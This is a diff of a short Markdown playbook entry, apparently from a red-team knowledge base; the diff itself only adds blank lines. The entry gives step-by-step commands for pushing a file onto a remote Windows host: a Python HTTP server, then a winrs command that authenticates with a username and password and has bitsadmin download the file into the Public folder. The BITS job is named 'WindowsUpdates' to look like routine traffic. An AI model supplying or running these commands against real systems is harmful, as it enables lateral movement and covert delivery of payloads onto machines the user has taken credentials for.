@@ -32,7 +32,11 @@ Copy a file using user or admin credentials of a remote machine using WInRS to a
 
 Copy a file using user or admin credentials of a remote machine using WInRS to authenticate and initiate a command, and bitsadmin on the remote machine to fetch the file from an http server you have hosted on the same network.
 
+
+
 The HTTP server can be any server accessible by the target machine. If it has internet access, the HTTP server can be hosted on the internet.
+
+
 
 ## Objective
 
@@ -40,9 +44,15 @@ The HTTP server can be any server accessible by the target machine. If it has in
 
 2. Authenticate to the remote machine and execute bitsadmin to download the file from the HTTP server
 
+
+
 # Instructions
 
 1. Run the HTTP server in the same directory as the file to deliver and remember the IP address of this HTTP server
+
+
+
+
 
 **Command** ([[Launch a Python 3 Web Server]]):
 
@@ -50,13 +60,23 @@ The HTTP server can be any server accessible by the target machine. If it has in
 python3 -m http.server $_PORT
 ```
 
+
+
 2. Authenticate and download the file to the remote machines Public folder
+
+
+
+
 
 **Command** ([[Copy file to remote machine Bitsadmin LOL]]):
 
 ```bash
 winrs -r:$SERVER -u:.\$USER -p:$PASSWORD "bitsadmin /transfer WindowsUpdates /priority normal http://$HTTP_SERVER/$FILENAME c:\\Users\\Public\$FILENAME"
 ```
+
+
+
+
 
 ## Platforms
 
@@ -81,3 +101,5 @@ winrs -r:$SERVER -u:.\$USER -p:$PASSWORD "bitsadmin /transfer WindowsUpdates /pr
 ## Tags
 
 - [[file transfer]]
+
+
